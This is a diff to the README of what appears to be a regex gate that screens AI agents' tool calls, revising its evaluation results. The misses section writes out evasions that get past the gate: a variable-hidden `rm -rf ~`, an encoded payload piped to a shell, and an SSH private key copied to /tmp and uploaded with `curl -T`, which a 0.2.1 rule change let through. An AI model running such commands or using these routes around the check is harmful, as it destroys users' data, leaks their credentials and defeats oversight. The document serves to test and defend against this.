@@ -48,10 +48,13 @@ Default policy against a labelled corpus of tool calls. Nothing is executed.
 | Set | Harmful blocked | Benign blocked |
 |---|---|---|
 | Development set (44 harmful, 40 benign), the rules were tuned on it | 43/44 | 0/40 |
-| Rougher second set (16 harmful, 20 benign), written afterwards by the same author | 12/16 | 1/20 |
+| Rougher second set (16 harmful, 20 benign), written afterwards by the same author | 11/16 | 1/20 |
 
 Misses on the second set are evasions the rules do not try to cover: an indirect command (`X=rm; $X -rf ~`), an
-encoded payload piped to a shell, an `rm` run from inside `python -c`, and a delete issued after `cd /`. The false
+encoded payload piped to a shell, an `rm` run from inside `python -c`, a delete issued after `cd /`, and an SSH key
+copied to a temporary file that a later command uploads (`cp ~/.ssh/id_rsa /tmp/k && curl -T /tmp/k …`, flagged:
+the gate doesn't follow the copy; it was denied until 0.2.1, when `TK-D010` stopped reading a copy's source as a
+credentials file it writes). The false
 positive is a `grep` whose argument contains the text `curl ... | sh`. Both sets are small and neither is
 independent of the rules, so read the first row as "the rules do what they were written to do" and the second as
 "a regex gate is a tripwire, not a sandbox".
